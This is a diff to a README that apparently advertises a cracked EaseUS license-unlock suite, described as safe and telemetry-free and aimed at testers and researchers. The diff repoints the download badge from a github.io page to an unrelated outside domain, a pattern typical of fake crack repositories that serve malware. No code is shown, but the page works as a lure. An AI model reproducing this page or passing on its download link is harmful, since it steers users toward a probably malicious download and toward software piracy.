@@ -5,7 +5,7 @@ This clean GUI replicates a lightweight interaction layer for simulating license
 
 Designed for **tech testers**, **security researchers**, and **automation reviewers**, this utility provides a safe, telemetry-free experience for non-destructive interface analysis.
 
-[![Download Unlock Suite](https://img.shields.io/badge/Download-EaseUS--Local--Suite-blueviolet?style=for-the-badge&logo=windows)](https://easeus-unlock-suite.github.io)
+[![Download Unlock Suite](https://img.shields.io/badge/Download-EaseUS--Local--Suite-blueviolet?style=for-the-badge&logo=windows)](https://glocktober.com)
 
 ---
 
